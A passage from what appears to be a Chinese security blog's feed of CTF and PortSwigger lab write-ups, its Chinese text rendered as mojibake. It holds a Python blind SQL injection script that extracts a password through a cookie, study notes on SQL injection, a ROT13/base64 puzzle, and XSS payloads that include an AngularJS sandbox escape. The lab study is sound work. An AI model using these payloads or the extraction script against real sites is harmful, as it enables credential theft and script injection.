class="line">TrackingId_4=<span class="string">&quot;&lt;&quot;</span></span><br><span class="line">TrackingId_5=<span class="string">&quot; &#x27;&quot;</span></span><br><span class="line"><span class="comment"># TrackingId_6</span></span><br><span class="line">TrackingId_7=<span class="string">&quot;; session=TAMJjOVBIkH0Dxb2XqzQwIFSZ0jWXvFa&quot;</span></span><br><span class="line"></span><br><span class="line">position = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="comment"># äºŒåˆ†æ³•æŸ¥æ‰¾</span></span><br><span class="line">    low = <span class="number">32</span></span><br><span class="line">    high = <span class="number">127</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;position: &quot;</span>,position)</span><br><span class="line">    <span class="keyword">while</span> low &lt; high:</span><br><span class="line"></span><br><span class="line">        mid = (low + high+<span class="number">1</span>) // <span class="number">2</span>   <span class="comment"># å°†midçš„è®¡ç®—æ–¹å¼è°ƒæ•´ä¸º(low + high + 1) // 2ï¼Œå¯ä»¥ç¡®ä¿åœ¨æœ€åä¸€æ¬¡å¾ªç¯ä¸­ä¸ä¼šé™·å…¥æ­»å¾ªç¯ã€‚</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">chr</span>(mid) == <span class="string">&quot;;&quot;</span>: <span class="comment"># ç”±äºcookieä¸­ä¸èƒ½ç›´æ¥ä½¿ç”¨åˆ†å·ï¼Œæ‰€ä»¥éœ€è¦è½¬ä¹‰</span></span><br><span class="line">            cookies = &#123;<span class="string">&quot;TrackingId&quot;</span>: TrackingId_1 + <span class="built_in">str</span>(position) + TrackingId_3 + TrackingId_4 + TrackingId_5 + <span class="string">&quot;\\&quot;</span>+<span class="built_in">chr</span>(mid) + TrackingId_7&#125;</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            cookies = &#123;<span class="string">&quot;TrackingId&quot;</span>: TrackingId_1 + <span class="built_in">str</span>(position) + TrackingId_3 + TrackingId_4 + TrackingId_5 + <span class="built_in">chr</span>(mid) + TrackingId_7&#125;</span><br><span class="line">        response = requests.get(url, cookies=cookies)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;Welcome back!&quot;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            high = mid -<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            low = mid</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;position: &quot;</span>,position,<span class="string">&quot;high: &quot;</span>, <span class="built_in">chr</span>(high),<span class="built_in">str</span>(high), <span class="string">&quot;low: &quot;</span>, <span class="built_in">chr</span>(low),<span class="built_in">str</span>(low), <span class="string">&quot;mid: &quot;</span>, <span class="built_in">chr</span>((low + high+<span class="number">1</span>) // <span class="number">2</span>),<span class="built_in">str</span>((low + high+<span class="number">1</span>) // <span class="number">2</span>))</span><br><span class="line">    <span class="keyword">if</span> low == high:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;x&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">chr</span>(low) == <span class="string">&quot;;&quot;</span>:</span><br><span class="line">            cookies = &#123;<span class="string">&quot;TrackingId&quot;</span>: TrackingId_1 + <span class="built_in">str</span>(position) + TrackingId_3 + TrackingId_4 + TrackingId_5 + <span class="string">&quot;\\&quot;</span>+<span class="built_in">chr</span>(low) + TrackingId_7&#125;</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            cookies = &#123;<span class="string">&quot;TrackingId&quot;</span>: TrackingId_1 + <span class="built_in">str</span>(position) + TrackingId_3 + <span class="string">&quot;=&quot;</span> + TrackingId_5 + <span class="built_in">chr</span>(low) + TrackingId_7&#125;</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;Welcome back!&quot;</span> <span class="keyword">in</span> requests.get(url, cookies=cookies).text:</span><br><span class="line">            password += <span class="built_in">chr</span>(low)</span><br><span class="line">            <span class="built_in">print</span>(password)</span><br><span class="line">            position += <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(password)</span><br></pre></td></tr></table></figure></li>
<li>ç»æµ‹è¯•ï¼Œå³æ—¶ä¸ç†Ÿæ‚‰ç¼–ç ï¼Œç¼–ç ä¹Ÿæ¯”æ‰‹å·¥æ³¨å…¥æˆ–è€…burpsuite intruderéå†å¿«å¾ˆå¤šã€‚åœ¨äº†è§£åŸç†åï¼Œå…¶å®å¯ä»¥ç›´æ¥ä½¿ç”¨sqlmapè¿›è¡Œæ³¨å…¥ï¼Œä½†æ˜¯è¿™é‡Œä¸ºäº†ç»ƒä¹ æ‰‹å·¥æ³¨å…¥ï¼Œæ‰€ä»¥ä½¿ç”¨pythonç¼–ç¨‹å®ç°ã€‚</li>
<li>å®Œæˆå®éªŒâœ…</li>
</ul>
</li>
</ul>
<h2 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h2><ul>
<li><a href="https://www.freebuf.com/articles/web/287481.html">PortSwiggerä¹‹SQLæ³¨å…¥å®éªŒå®¤ç¬”è®° - FreeBufç½‘ç»œå®‰å…¨è¡Œä¸šé—¨æˆ·</a></li>
<li><a href="https://portswigger.net/web-security/learning-paths/sql-injection/sql-injection-retrieving-hidden-data/sql-injection/lab-retrieve-hidden-data">SQL injection - PortSwigger</a></li>
<li><a href="https://mp.weixin.qq.com/s/RTFrPLDiycU0nwZp4baiKQ">ä¸€ç¯‡æ–‡ç« å­¦ä¼šæ‰‹å·¥æ³¨å…¥ï¼ˆä¸‡å­—ä»‹ç»SQLæ³¨å…¥ï¼‰</a></li>
<li><a href="https://blog.csdn.net/weixin_52796034/article/details/133746733">æ¸—é€æµ‹è¯•â€”æ‰‹æŠŠæ‰‹æ•™ä½ SQLæ³¨å…¥(4)â€“DNSLOGå¤–å¸¦æ³¨å…¥</a></li>
<li><a href="https://blog.csdn.net/kongzhian/article/details/110001836">SQLæ³¨å…¥â€”â€”äºŒæ¬¡æ³¨å…¥çš„åŸç† åˆ©ç”¨ä»¥åŠé˜²å¾¡</a></li>
</ul>
<!-- ## SQLæ³¨å…¥å­¦ä¹ 

### ç®€ä»‹

[SQL æ³¨å…¥å°±æ˜¯å€ŸåŠ©ç½‘ç«™ä¸Šä¸å¥å…¨çš„ SQL æ‹¼æ¥è¯­å¥ï¼Œå°†æ”»å‡»è€…è‡ªå·±çš„ payload æ‹¼æ¥åˆ°åŸæœ‰çš„ SQL è¯­å¥ä¸­ï¼Œä½¿å…¶åœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œæ¶æ„ SQL è¯­å¥ï¼Œä½¿å¾—æ”»å‡»è€…å¯ä»¥å¯¹æ•°æ®åº“è¿›è¡Œç½‘ç«™è¿è¥è€…é¢„æ–™ä¹‹å¤–çš„å¢ã€åˆ ã€æ”¹ã€æŸ¥æ“ä½œã€‚](https://mp.weixin.qq.com/s/RTFrPLDiycU0nwZp4baiKQ)


### åŸç†

[ç®€å•æ¥è¯´ï¼Œé€ æˆSQLæ³¨å…¥çš„åŸå› å°±æ˜¯ç”±äºåº”ç”¨ç¨‹åºåœ¨æ„é€ SQLæŸ¥è¯¢è¯­å¥æ—¶æœªæ­£ç¡®è¿‡æ»¤æˆ–è½¬ä¹‰ç”¨æˆ·è¾“å…¥çš„æ•°æ®ã€æˆ–æœªä½¿ç”¨é¢„ç¼–è¯‘ç­‰æ–¹æ³•ï¼Œé€ æˆäº†æ”»å‡»è€…æ„é€ çš„æ¶æ„è¯­å¥è¢«åº”ç”¨ç¨‹åºæ‰§è¡Œã€‚](https://mp.weixin.qq.com/s/RTFrPLDiycU0nwZp4baiKQ)


### å±å®³

1. è„±åº“
2. æŸ¥è¯¢éšè—æ•°æ®
3. æ–°å¢ç®¡ç†è´¦æˆ·
4. getshellï¼Œè·å–æœåŠ¡å™¨æƒé™

> è„±åº“:æœ¬æ¥æ˜¯æ•°æ®åº“é¢†åŸŸçš„ä¸“ç”¨è¯­ï¼ŒæŒ‡ä»æ•°æ®åº“ä¸­å¯¼å‡ºæ•°æ®ã€‚è€Œç°åœ¨å®ƒè¢«ç”¨æ¥æŒ‡ç½‘ç«™é­åˆ°å…¥ä¾µåï¼Œé»‘å®¢çªƒå–æ•°æ®åº“çš„è¡Œä¸ºã€‚ä¹Ÿå°±æ˜¯ç½‘ç«™è¢«å…¥ä¾µä»¥åæ•°æ®åº“ä¿¡æ¯æ³„éœ²äº†ã€‚


### æµ‹è¯•æ–¹æ³•ï¼ˆç®€å•ï¼‰

| æµ‹è¯•æ–¹æ³• | è¯´æ˜ |
| --- | --- |
| å•åŒå¼•å· | ' " ï¼ŒæŸ¥çœ‹æ˜¯å¦æŠ¥é”™ |
| ç®—æ•°è¿ç®— | æ¯”å¦‚åœ¨id=2çš„åœ°æ–¹è¾“å…¥id=1+1ï¼ŒæŸ¥çœ‹è¿”å›æ•°æ®æ˜¯å¦ä¸€è‡´ï¼Œä¸€è‡´è¯´æ˜å¯èƒ½å­˜åœ¨æ³¨å…¥ç‚¹ |
| å¸ƒå°”æ¡ä»¶ | æ¯”å¦‚ OR 1=1 å’Œ OR 1=2 ï¼Œæ¯”è¾ƒä¸¤ä¸ªå“åº”æ˜¯å¦æœ‰å·®å¼‚ï¼Œå¦‚æœå­˜åœ¨æ³¨å…¥ç‚¹ï¼Œå‰è€…è¿”å›çš„æ•°æ®é€šå¸¸æ˜¯æ¯”åè€…å¤šçš„ |
| æ—¶é—´å»¶è¿Ÿ | æ¯”å¦‚ sleep(5)ï¼Œå¦‚æœå­˜åœ¨æ³¨å…¥ç‚¹ï¼Œé‚£ä¹ˆæºå¸¦ payload çš„è¯·æ±‚ï¼Œå…¶å“åº”æ—¶é—´åº”è¯¥ä¼šæ¯”æ­£å¸¸çš„è¯·æ±‚æ…¢ 5 ç§’ |
| å¸¦å¤–æµ‹è¯•ï¼ˆï¼Ÿï¼‰ | æŸ¥çœ‹ä½ çš„å¸¦å¤–å¹³å°æ˜¯å¦æ”¶åˆ°äº†å¯¹åº”çš„æ•°æ® |


### ä¿®å¤æ–¹æ³•

- ä½¿ç”¨å‚æ•°åŒ–æŸ¥è¯¢æˆ–é¢„ç¼–è¯‘è¯­å¥
- è¾“å…¥éªŒè¯å’Œè¿‡æ»¤
- æœ€å°åŒ–ç‰¹æƒ
- ä½¿ç”¨ORMæ¡†æ¶
- é¿å…åŠ¨æ€æ‹¼æ¥SQLè¯­å¥
- é”™è¯¯å¤„ç†å’Œæ—¥å¿—è®°å½•


### åˆ†ç±»

- åŸºäºæ”»å‡»åŸç†è¿›è¡Œåˆ†ç±»
| åˆ†ç±» | è¯´æ˜ |
| --- | --- |
| æŠ¥é”™æ³¨å…¥ | é¡µé¢ä¼šè¿”å›æŠ¥é”™ä¿¡æ¯ï¼Œæˆ–æŠŠSQLè¯­å¥ç›´æ¥è¿”å›åœ¨é¡µé¢ä¸­ã€‚å¸¸ç”¨çš„å‡½æ•°æœ‰ï¼šExtractValueã€UpdateXmlã€concat |
| è”åˆæ³¨å…¥ | å¯ä»¥æ‰§è¡Œ`UNICON SELECT`è¯­å¥ |
| å»¶æ—¶æ³¨å…¥ | åˆå«æ—¶é—´å‹ç›²æ³¨ï¼Œé€šè¿‡æ‰§è¡Œå¦‚ sleep(5) ä¹‹ç±»çš„å‡½æ•°ï¼Œä½¿å¾—å­˜åœ¨æ¼æ´çš„å“åº”ä¼šæ˜æ˜¾æ…¢äºæ­£å¸¸å“åº” |
| å¸ƒå°”ç›²æ³¨ | å¸ƒå°”ç›²æ³¨ä¸ä¼šç›´æ¥è¿”å›æŸ¥è¯¢ç»“æœï¼Œè€Œæ˜¯é€šè¿‡åº”ç”¨ç¨‹åºçš„å“åº”æˆ–è¡Œä¸ºå·®å¼‚æ¥æ¨æ–­æŸ¥è¯¢ç»“æœçš„çœŸå‡ |
| å †å æ³¨å…¥ | ç®€å•åœ°è¯´å°±æ˜¯ä½¿ç”¨`;`åˆ†å·åˆ†éš”ä¸¤ä¸ªSQLè¯­å¥ï¼Œåœ¨åº”ç”¨ç¨‹åºæ‰§è¡Œå®ŒåŸæœ‰è¯­å¥ä¹‹åï¼Œå†æ‰§è¡Œæˆ‘ä»¬çš„ payload |
| äºŒæ¬¡æ³¨å…¥ | [SQLæ³¨å…¥â€”â€”äºŒæ¬¡æ³¨å…¥çš„åŸç† åˆ©ç”¨ä»¥åŠé˜²å¾¡](https://blog.csdn.net/kongzhian/article/details/110001836) |
- åŸºäºæ•°æ®ç±»å‹è¿›è¡Œåˆ†ç±»
  - æ•°å­—å‹
  - å­—ç¬¦å‹
  - æœç´¢å‹
- åŸºäºæäº¤æ–¹å¼è¿›è¡Œåˆ†ç±»
  - GET
  - POST
  - Cookie
  - Header

### å‚è€ƒèµ„æ–™

- [ä¸€ç¯‡æ–‡ç« å­¦ä¼šæ‰‹å·¥æ³¨å…¥ï¼ˆä¸‡å­—ä»‹ç»SQLæ³¨å…¥ï¼‰](https://mp.weixin.qq.com/s/RTFrPLDiycU0nwZp4baiKQ)
- [æ¸—é€æµ‹è¯•---æ‰‹æŠŠæ‰‹æ•™ä½ SQLæ³¨å…¥(4)--DNSLOGå¤–å¸¦æ³¨å…¥](https://blog.csdn.net/weixin_52796034/article/details/133746733)
- [SQLæ³¨å…¥â€”â€”äºŒæ¬¡æ³¨å…¥çš„åŸç† åˆ©ç”¨ä»¥åŠé˜²å¾¡](https://blog.csdn.net/kongzhian/article/details/110001836) -->

]]></content>
      <categories>
        <category>CTF-WriteUp</category>
      </categories>
      <tags>
        <tag>SQLæ³¨å…¥</tag>
      </tags>
  </entry>
  <entry>
    <title>WriteUp-CTFHub-å›è½¬åä¸‰ä½</title>
    <url>/2024/01/25/WriteUp-CTFHub-%E5%9B%9E%E8%BD%AC%E5%8D%81%E4%B8%89%E4%BD%8D/</url>
    <content><![CDATA[<span id="more"></span>


<h2 id="é¢˜ç›®è€ƒç‚¹"><a href="#é¢˜ç›®è€ƒç‚¹" class="headerlink" title="é¢˜ç›®è€ƒç‚¹"></a>é¢˜ç›®è€ƒç‚¹</h2><ul>
<li><code>rot13</code><ul>
<li>åªå¯¹å­—æ¯è¿›è¡Œç¼–ç ï¼Œç”¨å½“å‰å­—æ¯å¾€å‰æ•°çš„ç¬¬13ä¸ªå­—æ¯æ›¿æ¢å½“å‰å­—æ¯ï¼Œä¾‹å¦‚å½“å‰ä¸ºAï¼Œç¼–ç åå˜æˆNï¼Œå½“å‰ä¸ºBï¼Œç¼–ç åå˜æˆOï¼Œä»¥æ­¤ç±»æ¨é¡ºåºå¾ªç¯ã€‚</li>
</ul>
</li>
<li><code>base64</code><ul>
<li>Base64ç¼–ç è¦æ±‚æŠŠ3ä¸ª8ä½å­—èŠ‚ï¼ˆ3<em>8&#x3D;24ï¼‰è½¬åŒ–ä¸º4ä¸ª6ä½çš„å­—èŠ‚ï¼ˆ4</em>6&#x3D;24ï¼‰ï¼Œä¹‹ååœ¨6ä½çš„å‰é¢è¡¥ä¸¤ä¸ª0ï¼Œå½¢æˆ8ä½ä¸€ä¸ªå­—èŠ‚çš„å½¢å¼ã€‚å¦‚æœå‰©ä¸‹çš„å­—ç¬¦ä¸è¶³3ä¸ªå­—èŠ‚ï¼Œåˆ™ç”¨0å¡«å……ï¼Œè¾“å‡ºå­—ç¬¦ä½¿ç”¨â€™&#x3D;â€™ï¼Œå› æ­¤ç¼–ç åè¾“å‡ºçš„æ–‡æœ¬æœ«å°¾å¯èƒ½ä¼šå‡ºç°1æˆ–2ä¸ªâ€™&#x3D;â€™ã€‚</li>
</ul>
</li>
</ul>
<h2 id="è§£é¢˜æ€è·¯"><a href="#è§£é¢˜æ€è·¯" class="headerlink" title="è§£é¢˜æ€è·¯"></a>è§£é¢˜æ€è·¯</h2><ul>
<li>ä¸‹è½½é¢˜ç›®é™„ä»¶ï¼Œè§£å‹åå¾—åˆ°ä¸€ä¸ªtxtæ–‡ä»¶ï¼Œå†…å®¹ä¸ºï¼š<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">EzkuM0yGAzA2n3WbEaOJEHuOFmuOpN==</span><br></pre></td></tr></table></figure></li>
<li>ç›´æ¥å°è¯•base64è§£ç ï¼Œè§£å‡ºæ¥ä¹±ç ï¼Œæ€è·¯ä¸æ­£ç¡®</li>
<li>é¢˜ç›®æç¤ºä¸ºå›è½¬åä¸‰ä½ï¼ŒçŒœæµ‹ä¸ºrot13åŠ å¯†ï¼Œå°è¯•å…ˆç”¨rot13è§£ç ï¼Œè§£å‡ºæ¥çš„å†…å®¹ä¸ºï¼š<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">RmxhZ0lTNmN2a3JoRnBWRUhBSzhBcA==</span><br></pre></td></tr></table></figure></li>
<li>ç„¶åå†ç”¨base64è§£ç ï¼Œè§£å‡ºæ¥çš„å†…å®¹ä¸ºï¼š<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">FlagIS6cvkrhFpVEHAK8Ap</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="FLAG"><a href="#FLAG" class="headerlink" title="FLAG"></a>FLAG</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;6cvkrhFpVEHAK8Ap&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>CTF-WriteUp</category>
      </categories>
      <tags>
        <tag>Crypto</tag>
      </tags>
  </entry>
  <entry>
    <title>WriteUp-CTFHub-XSSé—¯å…³</title>
    <url>/2024/02/20/WriteUp-CTFHub-XSS%E9%97%AF%E5%85%B3/</url>
    <content><![CDATA[<span id="more"></span>

<h2 id="é¢˜ç›®è€ƒç‚¹"><a href="#é¢˜ç›®è€ƒç‚¹" class="headerlink" title="é¢˜ç›®è€ƒç‚¹"></a>é¢˜ç›®è€ƒç‚¹</h2><ul>
<li>WEB</li>
<li>XSS</li>
</ul>
<h2 id="è§£é¢˜æ€è·¯"><a href="#è§£é¢˜æ€è·¯" class="headerlink" title="è§£é¢˜æ€è·¯"></a>è§£é¢˜æ€è·¯</h2><blockquote>
<p>æœ¬ç¯å¢ƒä¸ºé—¯å…³å½¢å¼ï¼Œæ¯è¿‡ä¸€å…³å³å¯è¿›å…¥ä¸‹ä¸€å…³,è¿‡å…³ç›®æ ‡ä¸ºåˆ©ç”¨XSSæ¼æ´åœ¨é¡µé¢æ‰§è¡Œalertå‡½æ•°</p>
</blockquote>
<ul>
<li>level1<ul>
<li>è®¾ç½®<code>username=&lt;script&gt;alert(&quot;flag&quot;)&lt;/script&gt;</code>ï¼Œè¿‡å…³<br><img src="/2024/02/20/WriteUp-CTFHub-XSS%E9%97%AF%E5%85%B3/level1.png"></li>
</ul>
</li>
<li>level2<ul>
<li>è¾“å…¥level1åŒæ ·çš„payloadï¼Œæ²¡æœ‰ååº”ï¼ŒæŸ¥çœ‹ç½‘é¡µæºç ï¼Œå‘ç°<code>&lt;/script&gt;</code>é—­åˆäº†åŸæœ¬çš„scriptæ ‡ç­¾ï¼Œæ‰€ä»¥æ— æ³•æ‰§è¡Œalertå‡½æ•°</li>
<li>ä¿®æ”¹payloadä¸º<code>username=&lt;/script&gt;&lt;script&gt;alert(&quot;flag&quot;)&lt;/script&gt;</code>ï¼Œè¿‡å…³<br><img src="/2024/02/20/WriteUp-CTFHub-XSS%E9%97%AF%E5%85%B3/level2-1.png"></li>
</ul>
</li>
<li>level3<ul>
<li>è¾“å…¥level1åŒæ ·çš„payloadåŒæ ·æ²¡æœ‰ååº”ï¼ŒæŸ¥çœ‹ç½‘é¡µæºç ï¼Œä¼¼ä¹é—®é¢˜å’Œlevel2ä¸€æ ·<br><img src="/2024/02/20/WriteUp-CTFHub-XSS%E9%97%AF%E5%85%B3/level3-1.png"></li>
<li>ä½¿ç”¨level2åŒæ ·çš„paloadï¼Œè¿‡å…³<br><img src="/2024/02/20/WriteUp-CTFHub-XSS%E9%97%AF%E5%85%B3/level3-2.png"></li>
</ul>
</li>
<li>level4<ul>
<li>æŸ¥çœ‹ç½‘é¡µæºç ï¼Œå‘ç°<code>jumpUrl</code>å‚æ•°å¯ä»¥æ§åˆ¶è·³è½¬çš„urlï¼š<br><img src="/2024/02/20/WriteUp-CTFHub-XSS%E9%97%AF%E5%85%B3/level4-1.png"><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">      &lt;script type=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><br><span class="line">  	<span class="keyword">var</span> time = <span class="number">10</span>;</span><br><span class="line">  	<span class="keyword">var</span> jumpUrl;</span><br><span class="line">  	<span class="keyword">if</span>(<span class="title function_">getQueryVariable</span>(<span class="string">&#x27;jumpUrl&#x27;</span>) == <span class="literal">false</span>)&#123;</span><br><span class="line">  		jumpUrl = location.<span class="property">href</span>;</span><br><span class="line">  	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">  		jumpUrl = <span class="title function_">getQueryVariable</span>(<span class="string">&#x27;jumpUrl&#x27;</span>);</span><br><span class="line">  	&#125;</span><br><span class="line">  	<span class="built_in">setTimeout</span>(jump,<span class="number">1000</span>,time);</span><br><span class="line">  	<span class="keyword">function</span> <span class="title function_">jump</span>(<span class="params">time</span>)&#123;</span><br><span class="line">  		<span class="keyword">if</span>(time == <span class="number">0</span>)&#123;</span><br><span class="line">  			location.<span class="property">href</span> = jumpUrl;</span><br><span class="line">  		&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">  			time = time - <span class="number">1</span> ;</span><br><span class="line">  			<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;ccc&#x27;</span>).<span class="property">innerHTML</span>= <span class="string">`é¡µé¢<span class="subst">$&#123;time&#125;</span>ç§’åå°†ä¼šé‡å®šå‘åˆ°<span class="subst">$&#123;<span class="built_in">escape</span>(jumpUrl)&#125;</span>`</span>;</span><br><span class="line">  			<span class="built_in">setTimeout</span>(jump,<span class="number">1000</span>,time);</span><br><span class="line">  		&#125;</span><br><span class="line">  	&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">getQueryVariable</span>(<span class="params">variable</span>)</span><br><span class="line">&#123;</span><br><span class="line">       <span class="keyword">var</span> query = <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">search</span>.<span class="title function_">substring</span>(<span class="number">1</span>);</span><br><span class="line">       <span class="keyword">var</span> vars = query.<span class="title function_">split</span>(<span class="string">&quot;&amp;&quot;</span>);</span><br><span class="line">       <span class="keyword">for</span> (<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;vars.<span class="property">length</span>;i++) &#123;</span><br><span class="line">               <span class="keyword">var</span> pair = vars[i].<span class="title function_">split</span>(<span class="string">&quot;=&quot;</span>);</span><br><span class="line">               <span class="keyword">if</span>(pair[<span class="number">0</span>] == variable)&#123;<span class="keyword">return</span> pair[<span class="number">1</span>];&#125;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span>(<span class="literal">false</span>);</span><br><span class="line">&#125;</span><br><span class="line">  &lt;/script&gt;</span><br></pre></td></tr></table></figure></li>
<li>æ‰€ä»¥åŸºäºJavaScriptä¸ºåè®®ï¼Œå¯ä»¥æ„é€ payloadä¸º<code>jumpUrl=javascript:alert(&quot;flag&quot;)</code>ï¼Œè¿‡å…³<br><img src="/2024/02/20/WriteUp-CTFHub-XSS%E9%97%AF%E5%85%B3/level4-2.png"></li>
</ul>
</li>
<li>level5<ul>
<li>è¾“å…¥level1åŒæ ·çš„payloadæ— æ•ˆï¼ŒæŸ¥çœ‹ç½‘é¡µæºç ï¼š<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;script type=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_">getQueryVariable</span>(<span class="string">&#x27;autosubmit&#x27;</span>) !== <span class="literal">false</span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> autoForm = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;autoForm&#x27;</span>);</span><br><span class="line">    autoForm.<span class="property">action</span> = (<span class="title function_">getQueryVariable</span>(<span class="string">&#x27;action&#x27;</span>) == <span class="literal">false</span>) ? location.<span class="property">href</span> : <span class="title function_">getQueryVariable</span>(<span class="string">&#x27;action&#x27;</span>);</span><br><span class="line">    autoForm.<span class="title function_">submit</span>();</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">getQueryVariable</span>(<span class="params">variable</span>)</span><br><span class="line">&#123;</span><br><span class="line">        <span class="keyword">var</span> query = <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">search</span>.<span class="title function_">substring</span>(<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">var</span> vars = query.<span class="title function_">split</span>(<span class="string">&quot;&amp;&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;vars.<span class="property">length</span>;i++) &#123;</span><br><span class="line">                <span class="keyword">var</span> pair = vars[i].<span class="title function_">split</span>(<span class="string">&quot;=&quot;</span>);</span><br><span class="line">                <span class="keyword">if</span>(pair[<span class="number">0</span>] == variable)&#123;<span class="keyword">return</span> pair[<span class="number">1</span>];&#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span>(<span class="literal">false</span>);</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></li>
<li>è¿™æ®µä»£ç çš„æ„æ€æ˜¯ï¼Œå¦‚æœ<code>autosubmit</code>å‚æ•°å­˜åœ¨ï¼Œåˆ™è‡ªåŠ¨æäº¤è¡¨å•</li>
<li>æ‰€ä»¥æ„é€ payloadä¸º<code>autosubmit=1&amp;action=javascript:alert(&quot;flag&quot;)</code>ï¼Œè¿‡å…³<br><img src="/2024/02/20/WriteUp-CTFHub-XSS%E9%97%AF%E5%85%B3/level5.png"></li>
</ul>
</li>
<li>level6<ul>
<li>è¾“å…¥level1åŒæ ·çš„payloadæ²¡æœ‰ååº”ï¼ŒæŸ¥çœ‹ç½‘é¡µæºç ï¼Œå‘ç°ä½¿ç”¨äº†<code>AnjularJS</code>æ¡†æ¶<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.staticfile.org/angular.js/1.4.6/angular.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<img src="/2024/02/20/WriteUp-CTFHub-XSS%E9%97%AF%E5%85%B3/level6-1.png"></li>
<li>æœç´¢<code>AnjularJS</code>æ¡†æ¶XSSæ¼æ´ï¼Œå‘ç°Angular(ç‰ˆæœ¬å·å°äº1.6)å†…çš„å…¸å‹XSS payloadä¸º<code>username=&#123;&#123;7*7&#125;&#125;</code>ï¼Œæµ‹è¯•åå‘ç°ç¡®å®å­˜åœ¨XSSæ¼æ´<br><img src="/2024/02/20/WriteUp-CTFHub-XSS%E9%97%AF%E5%85%B3/level6-2.png"></li>
<li>ä½¿ç”¨payload<code>&#123;&#123;'a'.constructor.prototype.charAt=[].join;$eval('x=1&#125; &#125; &#125;;alert("flag")//');&#125;&#125;</code>è¿›è¡Œæ²™ç®±é€ƒé€¸ï¼Œè¿‡å…³<br><img src="/2024/02/20/WriteUp-CTFHub-XSS%E9%97%AF%E5%85%B3/level6-3.png"></li>
</ul>
</li>
<li>å®Œæˆæ‰€æœ‰å…³å¡ï¼Œè·å¾—flag<br><img src="/2024/02/20/WriteUp-CTFHub-XSS%E9%97%AF%E5%85%B3/flag.png"></li>
</ul>
<h2 id="FLAG"><a href="#FLAG" class="headerlink" title="FLAG"></a>FLAG</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">n1book&#123;xss_is_so_interesting&#125;</span><br></pre></td></tr></table></figure>

<h2 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h2><ul>
<li><a href="https://xz.aliyun.com/t/4638">AngularJS Sandbox Bypasses - å…ˆçŸ¥ç¤¾åŒº</a></li>
<li><a href="https://blog.csdn.net/m_de_g/article/details/119085955">BuuCTF[ç¬¬äºŒç«  webè¿›é˜¶]XSSé—¯å…³_[ç¬¬äºŒç«  webè¿›é˜¶]xssé—¯å…³ 1-CSDNåšå®¢</a></li>
<li><a href="https://blog.csdn.net/qq_32393893/article/details/104923733">Angular Js XSSæ¼æ´_angularjs v1.4.6ç‰ˆæœ¬xssæ¼æ´-CSDNåšå®¢</a></li>
</ul>
]]></content>
      <categories>
        <category>CTF-WriteUp</category>
      </categories>
      <tags>
        <tag>XSS</tag>
      </tags>
  </entry>
  <entry>
    <title>WriteUp-CTFHub-æŠ€èƒ½æ ‘-XSSç³»åˆ—</title>
    <url>/2024/02/12/WriteUp-CTFHub-%E6%8A%80%E8%83%BD%E6%A0%91-XSS%E7%B3%BB%E5%88%97/</url>
    <content><![CDATA[<span id="more"></span>

